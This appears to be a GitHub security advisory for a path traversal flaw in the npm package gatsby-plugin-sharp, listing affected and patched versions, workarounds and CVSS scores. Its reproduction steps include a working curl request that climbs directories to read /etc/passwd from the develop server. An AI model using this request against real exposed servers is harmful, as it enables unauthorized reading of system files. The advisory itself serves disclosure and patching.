# Path traversal vulnerability exposed by Gatsby develop server in gatsby-plugin-sharp

Moderate

[mlgualtieri](/mlgualtieri)
published
GHSA-h2pm-378c-pcxx
Apr 17, 2023

## Package

npm

gatsby-plugin-sharp
([npm](/advisories?query=ecosystem%3Anpm))

## Affected versions

<=5.8.0; <=4.25.0

## Patched versions

5.8.1; 4.25.1

## Description

### Impact

The gatsby-plugin-sharp plugin prior to versions 5.8.1 and 4.25.1 contains a path traversal vulnerability exposed when running the Gatsby develop server (`gatsby develop`).

The following steps can be used to reproduce the vulnerability:

```
# Create a new Gatsby project, and install gatsby-plugin-sharp
$ npm init gatsby
$ cd my-gatsby-site
$ npm install gatsby-plugin-sharp

# Add the plugin to gatsby-config.js
module.exports = {
  plugins: [
    {
      resolve: `gatsby-plugin-sharp`,
    },
  ]
}

# Start the Gatsby develop server
$ gatsby develop

# Execute the path traversal vulnerability
$ curl "http://127.0.0.1:8000/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

```

It should be noted that by default `gatsby develop` is only accessible via the localhost `127.0.0.1`, and one would need to intentionally expose the server to other interfaces to exploit this vulnerability by using server options such as `--host 0.0.0.0`, `-H 0.0.0.0`, or the `GATSBY_HOST=0.0.0.0` environment variable.

### Patches

A patch has been introduced in `gatsby-plugin-sharp@5.8.1` and `gatsby-plugin-sharp@4.25.1` which mitigates the issue by ensuring that included paths remain within the project directory.

### Workarounds

As stated above, by default `gatsby develop` is only exposed to the localhost `127.0.0.1`. For those using the develop server in the default configuration no risk is posed. If other ranges are required, preventing the develop server from being exposed to untrusted interfaces or IP address ranges would mitigate the risk from this vulnerability.

We encourage projects to upgrade to the latest major release branch for all Gatsby plugins to ensure the latest security updates and bug fixes are received in a timely manner.

### Credits

We would like to thank Patrick Rombouts and Bart Veneman [drukwerkdeal.nl] for bringing the issue to our attention.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N
